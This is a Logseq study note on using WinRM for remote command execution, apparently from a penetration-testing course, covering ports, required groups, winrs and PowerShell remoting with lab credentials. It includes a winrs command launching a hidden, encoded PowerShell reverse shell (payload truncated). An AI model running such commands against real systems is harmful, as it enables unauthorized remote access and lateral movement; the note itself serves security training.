public:: true

- [WinRM](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) is the Microsoft version of the [*Web Services-Management*](https://en.wikipedia.org/wiki/WS-Management) (WS-Management) open standard protocol.
- It establishes a session with a remote computer through the SOAP-based WS-Management protocol rather than a connection through [[DCOM]] , as [[WMI]] does. Data returned using the WS-Management protocol is formatted in XML instead of as objects.
- #+BEGIN_IMPORTANT
  It exchanges XML messages over HTTP and HTTPS. For that it uses **TCP port 5986 for encrypted HTTPS traffic** and **port 5985 for plain HTTP**.
  #+END_IMPORTANT
- You can use WinRM in different flavors: Powershell, [`winrs`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/winrs) or [`evil-winrm`](https://github.com/Hackplayers/evil-winrm) in linux
- #+BEGIN_IMPORTANT
  In order to connect via WinRM, the target user needs to be part of the **Administrators** or **Remote Management Users** group on the target host.
  #+END_IMPORTANT
- Let's see how to use `winrs` to run the `whoami` command on a remote target logging as user *jen*.
	- ```cmd
	  winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c whoami"
	  ```
	- As [already shown](((65a01d55-0fd2-4bbd-9251-edd80b50bbb9))) in [[WMI]], we can instead use it to get a reverse shell.
	  ```cmd
	  winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAG...G4AdAAuAEMAbABvAH"
	  ```
- PowerShell also has WinRM built-in capabilities called [*PowerShell remoting*](https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.4). Let's see how to use it to access a remote shell.
	- First, we need to create a [PSCredential](https://learn.microsoft.com/en-us/powershell/scripting/learn/deep-dives/add-credentials-to-powershell-functions?view=powershell-7.2) object to store the domain user credentials that we use to access the remote target.
	  logseq.order-list-type:: number
		- ```powershell
		  $username = 'jen';
		  $password = 'Nexus123!';
		  $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
		  $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
		  ```
	- Next, we can point the [*New-PSSession*](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession?view=powershell-7.4) cmdlet to the target machine and pass the PSCredential object.
	  logseq.order-list-type:: number
		- ```powershell
		  New-PSSession -ComputerName 192.168.50.73 -Credential $credential
		  ```
	- At this point a new *PSSession* would be available and we can enter it to interact with the remote shell.
	  logseq.order-list-type:: number
		- ```powershell
		  Enter-PSSession 1
		  ```